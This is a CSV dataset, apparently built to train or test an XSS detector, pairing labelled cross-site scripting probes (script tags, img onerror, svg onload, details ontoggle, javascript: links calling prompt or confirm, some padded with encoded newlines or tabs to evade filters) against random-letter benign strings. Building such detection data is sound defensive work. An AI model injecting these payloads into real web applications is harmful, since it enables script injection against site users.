payload,label
<%0ascript>prompt(1)<%0a/script>,1
<img src=x onerror=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
<a href=javascript:confirm(1)>click</a>,1
<%0ascript>confirm(1)<%0a/script>,1
knyUvewtlaJWbZHVzXK,0
<%09img src=x onerror=prompt(1)>,1
<%09script>prompt(1)<%09/script>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
mxcJcLZEGvLZoaCDXTeFdHk WazKiCrW ,0
EaJJIwsQdYHwuLXIFtiwnIARdyksUDgvaCebwF,0
<svg onload=confirm(1)>,1
JltFydTNaVyYjkKXquOOHg,0
<%09details ontoggle=confirm()>,1
<%09img src=x onerror=confirm(1)>,1
FDOFTiaSzh,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
ggfnogFjPyzmJcCHnbjYIYtVTxEaD,0
JrGWYrBIqOktqVX,0
ZfCLcILIAZDJs BKvbJgStLouebHSLcfZBeBd,0
aapbzankFHGUklSAVlGrZ,0
YblWCgwSIaBDLyXHsLhuvcGfP CreUeYgnd,0
<%0aimg src=x onerror=confirm(1)>,1
PnlfDFtDAodOUPywXSHPRObshQVJJWCfVKls,0
bLQyWayZkaUQzYoHizIdalDRjm Rabav wG,0
<details ontoggle=confirm()>,1
<%09img src=x onerror=prompt(1)>,1
SDhWWXSvqYEvsnhjLiFquLsCDkycxDFg,0
flPpVyBgxOPN,0
<script>confirm(1)</script>,1
tsjNm GZawqPMBrDBQSusltTjZRFCiBMy,0
RgjqKEByslvONj lnvpEYwRtPduSktgIWHAZ,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%0ascript>prompt(1)<%0a/script>,1
KMxapcYjFUFGJaKCL COmcsEw,0
xIpIUCHysjiI,0
gVoUtZHUznPYoIpbepRYkGTcxqsxx,0
TyNZrMbLYaftkJMCr,0
<%0aimg src=x onerror=prompt(1)>,1
NdpomuvEHNVA,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<img src=x onerror=prompt(1)>,1
pUx fYBjRYI,0
<%0adetails ontoggle=confirm()>,1
<svg onload=prompt(1)>,1
<script>prompt(1)</script>,1
lGJMRwnrWYngVKutKljoyFhGiFRjr dCjdy,0
Ta TrnKFBYPrt,0
FmMOtmhQnwrXXvQadu,0
BQYbiAScJrkjobgwZmEsLdXeFdAN,0
YnkhGCdsLOAsiPwUNzbIF,0
<details ontoggle=confirm()>,1
lToshZKKjSptnCmTMClFfVaGwWLenLiBT,0
yJaXXyqNJasKwRxWQQnSSy,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0adetails ontoggle=confirm()>,1
<%0ascript>confirm(1)<%0a/script>,1
<%09svg onload=confirm(1)>,1
<%0asvg onload=prompt(1)>,1
<details ontoggle=confirm()>,1
ovpztMEyropHLUbpmOZnzUVKmcxVSqI,0
J lgDGpTCThneaZolROOxwbCp iXMrGAQMqWgip,0
<%0asvg onload=confirm(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<a href=javascript:prompt(1)>click</a>,1
KsfLRopAEjA,0
icZTcWGiDDop,0
EeMHBzczgReKSspWAvLGdWbCZqtyywPaPzwf,0
mZQycsVBvFriwcZKfLrpoOKdFayXiQZvgVpCGIg,0
qtOpQAtFpusskGWAGikP,0
oTOicKFEQBmWGIUjllXjxvnbvpu,0
abxeMhzckAj,0
<%0aimg src=x onerror=confirm(1)>,1
<img src=x onerror=confirm(1)>,1
qvaDysFryjppXBCPiZBHHg,0
gFdMoeLrpDllDfdwnENvV,0
sBsKUSLEvzq,0
<%09details ontoggle=confirm()>,1
EUxDZMANNVjFUv,0
JIMFDvgGvPDxSxpQaQArQdqgstvlhBs,0
<%0ascript>prompt(1)<%0a/script>,1
PdPZPYrYDYL,0
juPxYpkOwXWlfBbTZHSYPyypJh,0
SugKqoHSExaDQTVKlBQemfIFoxK gVAY,0
iWVpNoLnYDBZvs,0
<%0asvg onload=prompt(1)>,1
ewgBCAPyIkhiL,0
BqhqYSevgIArsQbH,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
ySTeJoOtFLoklCvGtGZyU NDgesNQmXb,0
qerQdjAbwUbAjrmadlx,0
<a href=javascript:confirm(1)>click</a>,1
<%0ascript>confirm(1)<%0a/script>,1
<%0aimg src=x onerror=prompt(1)>,1
PEoLbIKuOztEnGgYGWCzUYJu,0
ZzztlxHvYSCuOnAcFTjg,0
<svg onload=prompt(1)>,1
<%09svg onload=prompt(1)>,1
fQZwkSePAZGLxqfBZIGqhJIxYqvgkOANTXR,0
<%0adetails ontoggle=confirm()>,1
<%09img src=x onerror=prompt(1)>,1
zxWapHkGUVEpfMjhdHMomSef,0
tHjdVabBtkwmA IuHVYENQjkWqvui,0
LKGRTtJ pTwYGXIIfBBQKSJOCf Di,0
TNjnngqYBFYMMwDq lHMcNAQZTE,0
TFzXvijUMfFFb,0
<details ontoggle=confirm()>,1
<%09script>prompt(1)<%09/script>,1
RBjhzXMqzmx,0
QvYDXScBMv kMivLLYROQoqp,0
CqsirTYrslgfapJQKrDXCR,0
<%09details ontoggle=confirm()>,1
QCHHTLePfSpEYiP,0
oHyKpbvjeqn,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
BQ sWMIOBp,0
LBvJVM JXL,0
<%0asvg onload=confirm(1)>,1
<a href=javascript:prompt(1)>click</a>,1
<%0aimg src=x onerror=prompt(1)>,1
EKnjhPGY tQbaxXFIjBbGiDzhzmP,0
dVUPnlAZLtT,0
<%0aimg src=x onerror=confirm(1)>,1
<%0asvg onload=confirm(1)>,1
<%09img src=x onerror=prompt(1)>,1
RJkjPscsuZDMRapWjhmIFhcWvbIgCaOBMUTQkwH,0
yiOub qyqWNosJriZaPTCSpQj c,0
IRxUWxtIDhgEgyBbXVQUMCxrmBWOAKbIlVfq,0
UuhOSRlGKomRirnxRSFZVzvOuTXwhDb,0
ljMndYewvFEVXyWwRKWypIEAEEVr,0
uqnoLjZyIhZFOZZtUPgCOBhreygUqPrJmhEg,0
<a href=javascript:confirm(1)>click</a>,1
OQxgpaBwDtKCshoBLnQiRYmWZMiEga,0
jLTDfMRLUvcZkvGLNGz,0
<script>confirm(1)</script>,1
<a href=javascript:confirm(1)>click</a>,1
<%09details ontoggle=confirm()>,1
AKqLmaanclzEuNcBaqFRwJMqVDgeRNFeDOcd,0
<%09details ontoggle=confirm()>,1
<a href=javascript:confirm(1)>click</a>,1
kpLzcjUhoUwWuq,0
DzLFaqDIjmT,0
NhArMMXmWRCrBPRbKqdssxxOEPSwc,0
WdQwLjBydJTrNhgJgYOSgfhgoJXeTvprFqK,0
RXsYAvWwKWNdqrvXSXoYMgk  c AjnXBOluLZk,0
zmxiZMTclECBgpXblzbSvIV,0
<details ontoggle=confirm()>,1
rssXjTVoBqi YwDuEOsznhkPrynVIA,0
<%09img src=x onerror=confirm(1)>,1
GMfZzqOxFHyeTY,0
TIksNDAFEqwrHTJQCIxQrdmvsWcO,0
<%0adetails ontoggle=confirm()>,1
qQcSLluuSaxBCUCTeyvFZlnVUhnvuqgJdy,0
dQQlDrAcicQJynBTApYvRFSMPueEiBKeJxhpt,0
gqWGHvXLyqmmQtAUNuOxCycVTulgVwOXwlwldl,0
kyBy shHMDsZwSCAMeLPrbZeJfIu,0
QrmiKBSyIedANdEkfCvrSKuEIFyFMmmBJPp,0
GuNRqjH tbPMjnANChMhgxCNeqUIe,0
xPFb KPqCgOvDFqaKHp,0
<%09details ontoggle=confirm()>,1
BbHuXNLrEpxfeRtt,0
<%09svg onload=prompt(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%09script>confirm(1)<%09/script>,1
tWMt jIsKVvmXPBxxNmfhb,0
HpMIfcRjyRDkoVJZNOu WXg,0
<%09svg onload=confirm(1)>,1
<script>prompt(1)</script>,1
lEuZpeUuuQFKBpMWkgBBkcJOB,0
<%0asvg onload=confirm(1)>,1
nB VjmWepDnnmRsqELqXrgp WdANoxjlMfGaO,0
cAQHnpaZXrvtQxj KWLpQRpnsQgYg,0
LXQnZBRrhtuJNqZZ,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%0ascript>confirm(1)<%0a/script>,1
<%09script>prompt(1)<%09/script>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
GngiSfYlgPOsNUimJDPQiUfXcZzMbEDlc,0
<%0aimg src=x onerror=prompt(1)>,1
usFZVsfLZTzGCULycIfUwM,0
REtYcgftZDzvaFztOFULan,0
WYOAGeRAVuBMVtIZTZSsJ,0
hwtqpud WpjTNlc ,0
<svg onload=prompt(1)>,1
CLmQcJhKOebEg ,0
<script>prompt(1)</script>,1
<%0adetails ontoggle=confirm()>,1
ZBjAqYkmbwKGqG,0
eeXuqvSllYesJscxnNgHQljYXpShU,0
<a href=javascript:confirm(1)>click</a>,1
<script>confirm(1)</script>,1
<%0asvg onload=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
MthsDDraDniZQv ouPhsGQyNrtxsla,0
zEwHACfIDMZc,0
<a href=javascript:confirm(1)>click</a>,1
ALCxVlpNNyzKgasX,0
EoWoyXKIXqwrBiVIBGT vLaVKHEqGZSeoi,0
<details ontoggle=confirm()>,1
wvhIbiQoxsDcIPAKst,0
<%09script>confirm(1)<%09/script>,1
<%09details ontoggle=confirm()>,1
znEDvnFTgeZKbhdWhSMJbRJlbZtUQ,0
li VtkKnVoPrZzhVipb,0
BOzWmkWRSWbXRBnWtc,0
ZDLJimMzKmVukTyCWAAc pXA oH,0
tyaPVIVPF m,0
<svg onload=confirm(1)>,1
duMEE xRGtutorICdPmKePmXFGoPKgEJNI,0
<%09svg onload=confirm(1)>,1
zLYSBQaJScsLiI w eawqiQYoeJSRtYuBg yHJ,0
RklPjOqeofsyMAZNbiqqaTEIXhy,0
gqpKMNQJuFzBpIXIYJkCqyUCDqkdWDdMFrvHI,0
qQysFPbneDtiCNq oWd,0
oCNlnJiJrj,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
OYPKo mwLjkPEWKEJbjsKLVlvAhDoNF,0
wteNeCoMXakwfcblMeUjjnqkOl,0
Q MSwcqOEBx,0
COtqPFfXHrTREtmnp,0
<%09svg onload=prompt(1)>,1
xbPkYTMKydpuJoBbseVyessEw,0
<svg onload=prompt(1)>,1
<svg onload=prompt(1)>,1
<svg onload=prompt(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<a href=javascript:prompt(1)>click</a>,1
sbblSalyzDrXpuD gJtqqKhY,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
xISHBleOxfSUwcSjClzwyUvwPJKzINbNQntJ,0
<details ontoggle=confirm()>,1
YkRASti ZJZzcxv KEX,0
HiemKEM yxkZF,0
VRjEiitVPhCEDzZySnL ZtrocGrpnRsc,0
eW rreOodvfXu wSuTIPnIr,0
<%09svg onload=confirm(1)>,1
zUlySFRdmHTRYpUfvkIVquGG,0
GEpJbO grzSiDXvuyo n,0
<%09details ontoggle=confirm()>,1
<img src=x onerror=prompt(1)>,1
SEiUWFngaaDNltAEwpOimChzJsgsDjy MPNJzgSb,0
<%09details ontoggle=confirm()>,1
HAwwkdCTAUGKmJnXZX VlkZCZkR,0
<%0adetails ontoggle=confirm()>,1
<%09svg onload=confirm(1)>,1
<img src=x onerror=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
<img src=x onerror=confirm(1)>,1
<script>confirm(1)</script>,1
rxhomHNAFaQGQieI,0
XfysyqxfWKfXdwYvKowEEop,0
wHjxGAYHLyQmIJNXiwuJxdsbcl,0
<script>confirm(1)</script>,1
xqNvMdmnSkKEk,0
 oxzyzCWyAjKQqQULNiYF yOfrgxw,0
fyvJEvtX  luCLyr,0
<a href=javascript:confirm(1)>click</a>,1
peKbCKJxJTkSPoUJSV qt,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
jNuPNCSJEIHgLFrHPvqfEHi,0
KPutELWuHEKxpmnbIBTOEOKvJ,0
<%09svg onload=prompt(1)>,1
<details ontoggle=confirm()>,1
dANTyFyCleqwEnPTuP FfZf,0
OYWuCBKZKLhUqSFteXALBHcVQBXgaYIwujwfn,0
AKhxDmvJZh,0
<%0asvg onload=prompt(1)>,1
cloHndMTWAsr,0
<details ontoggle=confirm()>,1
VDUSLkLBeiLoovKEqAVymLdo ieOL,0
rXUxih CvXpRakXRHb WdduVGRykMrqgt  ,0
<%09details ontoggle=confirm()>,1
kNQcMOIOcmGmCfmAodTlyuYjUKtTCsPhMBa,0
<%09details ontoggle=confirm()>,1
<%0adetails ontoggle=confirm()>,1
VKttNyNOODoFRjrW,0
<%09img src=x onerror=confirm(1)>,1
<%09script>prompt(1)<%09/script>,1
UwQOczlycFABLJFoAA,0
<details ontoggle=confirm()>,1
<%0asvg onload=prompt(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
<%09script>prompt(1)<%09/script>,1
EPTpkDgoPkpuXOA,0
GgivhtchQmu,0
SXpzOMWdhXyEKXiZzVSgTYndJYQYfNG,0
kNHQeVZvybdyxQAFPXwtaMR,0
eXRjEyYYJRvlcBFdEBjsfUHETjtuKgozGNOpxNkf,0
<%09img src=x onerror=confirm(1)>,1
<%09img src=x onerror=confirm(1)>,1
LbFsNOGFQnqTOvWnAw,0
oOhQEJmwppLI cDJBtvFM zpBvrYPfEnMN,0
YspojOVAWHPZgikMptZdeBlk,0
<%0asvg onload=confirm(1)>,1
<script>confirm(1)</script>,1
<%09svg onload=prompt(1)>,1
PBowUWEPdBIyBblrkCgdZSuPq,0
hLRgkPJSBpaADgPmAaopYcd nKTIBJvfQr,0
<a href=javascript:confirm(1)>click</a>,1
<details ontoggle=confirm()>,1
JQRlmzatkVLVEpGlqBOGQwzZOutNuiVBFvo,0
gnGAprYhMVrx,0
<img src=x onerror=confirm(1)>,1
<%09script>prompt(1)<%09/script>,1
<%0adetails ontoggle=confirm()>,1
sQLVoGdCexIZXMNtHmxOMiB,0
<%0adetails ontoggle=confirm()>,1
mcZHOSADrjIqBbHqwDGTW WE nWtqYH,0
<img src=x onerror=confirm(1)>,1
<img src=x onerror=confirm(1)>,1
<script>prompt(1)</script>,1
rrYVumipucWoTaRdRlDXEvKgz,0
yuf gZC QTAdpHAV,0
<img src=x onerror=prompt(1)>,1
ChqtrJEknRqDfNlediGFasmtv,0
<img src=x onerror=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
<%0asvg onload=prompt(1)>,1
OMZVVE ZpbCdjidfqJwfTZnBENwzLtMG Fj,0
<details ontoggle=confirm()>,1
<%09svg onload=prompt(1)>,1
<%0asvg onload=confirm(1)>,1
vsMHkGSTBAjEZXmMOBMu Ceht hAupnAimlWK,0
NwetkakVJDKP,0
CiubaEYghkhlgwjm,0
wwdxVEinsHxXicJTU,0
<%0adetails ontoggle=confirm()>,1
g lLnXbtDliKUWZRwPm,0
u nzRmtcKjOICGJZy,0
<%0aimg src=x onerror=confirm(1)>,1
<script>confirm(1)</script>,1
<%09svg onload=confirm(1)>,1
GLDSlYhgsyHAhdMQBfKyiUTpCzqnwKG,0
NWjqJOWGBWRQVNGxkGyDIfwtLcnTMgyrActUwQzo,0
<%09script>confirm(1)<%09/script>,1
<script>prompt(1)</script>,1
<%0ascript>prompt(1)<%0a/script>,1
LyegdQXsfVOZJsCnCpaCX,0
<%09svg onload=confirm(1)>,1
<details ontoggle=confirm()>,1
dWVToDPkSazskZmslPdzXAYBjASYOny,0
mFkLCAqYaYRGvbGVXnBpkSCNweGWyEmMermP,0
<%09svg onload=prompt(1)>,1
<%09script>prompt(1)<%09/script>,1
<img src=x onerror=prompt(1)>,1
Y gMpiuSo j sUSC,0
<details ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
<%0aimg src=x onerror=prompt(1)>,1
GEGxazJhtwNlArI,0
<%09script>prompt(1)<%09/script>,1
<%09img src=x onerror=confirm(1)>,1
<details ontoggle=confirm()>,1
RjIILgxwqLcZu CsjKRBiiQMf,0
<%0asvg onload=confirm(1)>,1
jgAqEGLLvPyZJVUbfQFTqU,0
MayMLAnfBDlmWH,0
EbMLvRglOpYxYep,0
gRNCIspowsRtG,0
<%09script>confirm(1)<%09/script>,1
res mPCtErMuYoTeTwkvi,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
ROYVEQrSHXs,0
zVkaGopCAFHxRwpIFQuGrhCAgIJkKAYmlYXgfM,0
wvTEyK VzDwiHrakc,0
ntZTZIWLzKqKGqEXhLCUUHUuXdlomh,0
ytIjMtoiBpfXjJ sulYsSrWT,0
VLbMaOUwYjwCPDwHNeuaHoJQZn,0
idgYEL zJyw,0
<%09script>prompt(1)<%09/script>,1
fwMLgso tuFThrZDWxLXeCcQOWykMAZuvHM,0
VlzCApwUvLCnjZjZgSH bSvRUPuBmgcsvGgHNr,0
ffvDfiRsiaAqMm lu,0
tJKPULcf YIGUagIxyceVHyVAxQyMRxxpdDK Cd,0
<%0aimg src=x onerror=confirm(1)>,1
<%0asvg onload=prompt(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
CNSjUxGRPZteakkZySYsDRZRJuDdfffg PofPL,0
PJonhhBGfbq,0
<%0asvg onload=confirm(1)>,1
WNzRLDBraerlLFXP,0
SHcYTndqRGLcCUoEwgrANBbTk,0
<a href=javascript:prompt(1)>click</a>,1
<%0ascript>confirm(1)<%0a/script>,1
rabHUjBOAjAnzY CoCGQeE,0
<%09img src=x onerror=prompt(1)>,1
FYsIwhbRLetIRAlXQjD,0
FZdqBcUtcruXUBzDNLbjStlpTlDY,0
lcROZtPlubPkTzVfcRjo,0
<img src=x onerror=prompt(1)>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<script>prompt(1)</script>,1
<a href=javascript:prompt(1)>click</a>,1
<%09script>prompt(1)<%09/script>,1
ERcVpfmhXffYReKEydtP qDApo FUMDZc,0
lEIQGtwuSTWimlPMvocYfetWWIFBYePRBMEH,0
sDnwtCrcExyD,0
<%09img src=x onerror=confirm(1)>,1
PJohtn IbOaaTUUVCdcfEkaomLtvvYad,0
tBQrATnEkZhpuDS,0
<%0adetails ontoggle=confirm()>,1
wvmFbKyItGflCgGHjkRWMvSbrQodfJ,0
SmOpNzLbCZzItLikaGatOsLYccDgNEQcLauRn,0
PRtzdfefyCNRI PW,0
<%0adetails ontoggle=confirm()>,1
hFOUWNfTPyZgOMTKcLhx nSZOMJjlhEwr,0
<%09img src=x onerror=confirm(1)>,1
DCgpGcdoPoZRFXJlFzGNbMqWrOXkjTD,0
xGTanmjxRafkgvRNABtbNizuNsEYFmjgNLdDL,0
<%09script>confirm(1)<%09/script>,1
<img src=x onerror=prompt(1)>,1
TLuNILXPVwmlupMKOheGUVGXerYPsCjzOaCcIhr,0
<%09svg onload=confirm(1)>,1
YDvqXiORXBTfQYqq,0
<%0asvg onload=confirm(1)>,1
SVwctYfEQolMQquYV,0
QbqwUuckvmytQYdKgBeihrN,0
i DLtfphdIEXbtUCRYYL,0
<svg onload=prompt(1)>,1
NI XQMPgEwoQLZKEVuGZQpLWEursGf x,0
SAyMFvhJbjnprmWBJbPjHXj,0
ocgCWLmGoHUBBkMSTMgxfnaxEFfuyfnYkvKDDBQF,0
SKzkDeGNYMI RFXkiBjgGomQwmcU NlEMJq,0
KQwctONKqFkItMyCIfStttGBDSgQRXosMzTjhoBh,0
<img src=x onerror=prompt(1)>,1
FPOcycSRzlbjmTNiRABuBlXWCQkNnhYOKo,0
<%09details ontoggle=confirm()>,1
jKGWctqyPrJRbVTOffbw ToUqRcsBnopPYlvVhwE,0
<svg onload=confirm(1)>,1
<%0asvg onload=confirm(1)>,1
<%09script>prompt(1)<%09/script>,1
<%0aimg src=x onerror=prompt(1)>,1
<svg onload=prompt(1)>,1
<%0aimg src=x onerror=prompt(1)>,1
lCmSAcOQGbbFJXGDAbxkrSHPLKBZpJGNpkjMqebl,0
JIrzlgmpYENFSSGczNMaGjaLjSYDrkQ,0
HENUXsdrWISMlnOSsgPnsDwzYCPFukIjZ,0
<svg onload=prompt(1)>,1
ZrXhOYGNuDiOqfvBjCuiYczVwd,0
<%09details ontoggle=confirm()>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0adetails ontoggle=confirm()>,1
tJXWYiSisYdkhisbNnZ,0
<svg onload=prompt(1)>,1
CmzTztEVN LpPyigKfIwoomCDBmkZnYTaG cuMPs,0
yCwsEyQ KeeIDcOv tam,0
aIbwpsjYhnmLdzWRTOxHQNQK,0
LQnBiR RUbuLWdHZqEGQ,0
<%09details ontoggle=confirm()>,1
phHJtw ovxFTufdcLKMuLBtkFFfasunLpXEcSntZ,0
VaGywMExkotsuZcYMGKwRzFMZIHFxHolrfWylh,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%0ascript>prompt(1)<%0a/script>,1
PZAaAVoBjW,0
SU hsmVNdqxcJTAeBpeNRHZRypZpYsQ,0
<%0adetails ontoggle=confirm()>,1
CUOnTENDGVFyp,0
<%0ascript>confirm(1)<%0a/script>,1
orVfljrjliB,0
<%09svg onload=confirm(1)>,1
bmeeEcuOOtyyEWZQGVxjkcHRsA,0
mXUfthZkiOKwgTyrirwYd c,0
PtWjByVIpIwycNJkQQ,0
KPsSXjlIsLYzdgwneTgciG,0
wZtaPOjqXtUpT,0
<%0ascript>prompt(1)<%0a/script>,1
XGVtWySYMjIEOMtVmhgu kCUJkXdqocf,0
<img src=x onerror=prompt(1)>,1
lYVXrNNKzYRtRrLC,0
<script>confirm(1)</script>,1
xiUx TGNGRCWeKdzBkSpaWGWGJFng,0
KuUAbdBoYXRNotKtlryvEIvTWVvprSvlUgYbQ JJ,0
qPOwD IPogLFXKQVETaRF,0
pIkAEDNQnjZnsv,0
<%0ascript>prompt(1)<%0a/script>,1
VszZPyxrDnPdVSSCdrXnzPFHLsEmVnLSJedmZw,0
YLdLzDtDlaYbrwC g,0
RPwvzkhoZQxmnMitUyipKaFYQvTHW,0
qdDVFkmZJUOQCTz DiqwRUTrjZbWT,0
<img src=x onerror=prompt(1)>,1
<details ontoggle=confirm()>,1
<script>prompt(1)</script>,1
xzaIEa aU RMSgnWsGyDGbIti,0
ZqKGfpvWLUmZyhmUOFzxmJX,0
 BROcxsVmsj JHz,0
DVYhugUFgaURBfUjKcOQ,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
bplftfXCuyOrMUtOrbCpOnwxEFMtouyLulmwn,0
iyyYPYwRIRzIqGTTKmYpijnxcQOSSHgSg TwgMs,0
<%09img src=x onerror=prompt(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<a href=javascript:confirm(1)>click</a>,1
YYwiVwgJLGqURTTooJQssYhzRSzGR,0
<%0adetails ontoggle=confirm()>,1
EREzxlkELUDZHCFoRZHidRBLyHqyZDTv,0
FcXPFgDqHpSZReDeTjsQx,0
<%09details ontoggle=confirm()>,1
SCOnzDtcxTQFBvaTnkpCpbOEcAnlpz,0
<img src=x onerror=confirm(1)>,1
QRtZPJiavfcGQjZQWrrUPRlQADapSes,0
rZqyzvOlzHyaLxOMYciKUlmYTE ,0
JQaRImpWbwMKsVUqQzKk,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
LzBbjpcmMMh,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
VIWyoIlClSRasoMyqv,0
<%09img src=x onerror=prompt(1)>,1
<%09details ontoggle=confirm()>,1
laIVRohZaCfW,0
<%09script>confirm(1)<%09/script>,1
hSOmz Yp vDwluwYWzHcqxklUho HpQWhzUm,0
<%09svg onload=confirm(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
oKFBGslSnAhQokvMDduG,0
egEaQvGTfPdhokhbcJTHYlfdWOm BRdy z uy,0
VpsDymMuKyWesFFAmtyzxRy,0
<a href=javascript:prompt(1)>click</a>,1
nnWQAbYtrz,0
oPmmJxhjkIyDBzoncTFUhePUiJwxCnK,0
<%09img src=x onerror=confirm(1)>,1
DeiFFCp eZDZmqyIHXCn,0
MQKHfsaNSdjyiRPSvKGceXhtCCguFXrrqTPyXnB,0
OuPLAkbnvXFxgZiKQWW kfQHIcTpKFfMUV ia,0
mrRpwexkpLxDJmUeXh,0
<img src=x onerror=prompt(1)>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<a href=javascript:confirm(1)>click</a>,1
tRiUqSnzsUgiBDhkiURShC JhfHsAuUkxuzrdOu ,0
<%09img src=x onerror=confirm(1)>,1
okMkbGcPcU,0
QVgONvOCIndEFMcOQtKgdzJvqNvaPhNpq U,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09svg onload=prompt(1)>,1
<%0aimg src=x onerror=confirm(1)>,1
fnZZOmIopSWWGQXaX eWgB SMdexZjSSEbeiB,0
<%0ascript>confirm(1)<%0a/script>,1
akvYFcIiwiYnNNuuVKXjeoCwO,0
ovRtZslWNBxVEpyTgiulvIa,0
QoelmRyZWLJAyntewYCrIRqalW,0
<svg onload=confirm(1)>,1
MbFyTatjOXIj EaQRDllmxrkR dzjoKGOEIlkVjq,0
iKxwacPhTHYuMuYLJaXwHQtTmtGg,0
HhJtPvClgQzvUoUhiTDHB,0
<%09img src=x onerror=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
vWjSwAoHYuWGPzYLRi,0
<%09details ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
<script>prompt(1)</script>,1
<%0adetails ontoggle=confirm()>,1
ZBtGpKVnpZj QOjox,0
VkdCumxImNtUpIEub uMwuYikiMqBwCRQ,0
rLGYkGxhvKpptqFV,0
<svg onload=prompt(1)>,1
MPsvDPzGqAQXOcjmiNMiL,0
ITja dS U PpMzknFZgUEKWuOjKJI,0
<%09details ontoggle=confirm()>,1
YMjkwEpWDjkbpTZRkEvAuYZrknmVdu,0
XdmZfbBbNFYL,0
<%09script>prompt(1)<%09/script>,1
<script>prompt(1)</script>,1
fFOEerkUSYMPnfAfllkgbYihPfumY,0
qcUpKKQaGplVx wmNTGHnrRymPWIQFvSAwlu,0
vvHX nsxnz sHxJbAKKZaqPDlmALyJFIF,0
<details ontoggle=confirm()>,1
 gd CefwFArimWwBQSvmsmHwTjUzrw,0
<%09img src=x onerror=confirm(1)>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%0ascript>confirm(1)<%0a/script>,1
tHROtxLqLyqwBxZtyTDNahVfCYNBeMMDXZWg,0
vabdtSpzWfQA,0
pShrOobCQKCmqpN,0
<script>confirm(1)</script>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
BEGbWneYOTfBksQKorkKdBSgiXhstqoW,0
YIsqWQtvohJPj,0
QPgIvurdKc,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09img src=x onerror=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
vBhRvqJhZQSCmcCAAAgGmeALHDRgGsVWh,0
<%09img src=x onerror=prompt(1)>,1
<%09details ontoggle=confirm()>,1
 rncVxpoyueGWJQbabJyMHejhaBSnqw,0
ds PsUURNDIZnfsjEvVaJtLiWpMJFEu pEFlgfR,0
KZxXNXQEpkA,0
<svg onload=confirm(1)>,1
<details ontoggle=confirm()>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<svg onload=prompt(1)>,1
<svg onload=prompt(1)>,1
<script>prompt(1)</script>,1
<%0aimg src=x onerror=confirm(1)>,1
VIPyiFjZCvyr,0
YIHPpeHzaAHQ,0
<%0asvg onload=prompt(1)>,1
Ie xMudjUbjRIpvskBiJdIIn ,0
